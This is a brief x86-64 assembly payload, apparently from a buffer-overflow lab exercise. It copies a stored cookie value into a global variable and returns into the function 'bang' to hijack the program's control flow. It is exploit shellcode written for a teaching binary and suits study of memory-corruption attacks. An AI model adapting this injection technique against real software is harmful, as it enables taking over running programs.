mov 0x602320, %rax    # Load the cookie into RAX
mov %rax, 0x602308               # Move the value of RAX (cookie) into global_value
push $0x401020                   # Push the address of bang onto the stack
retq                             # Return to bang
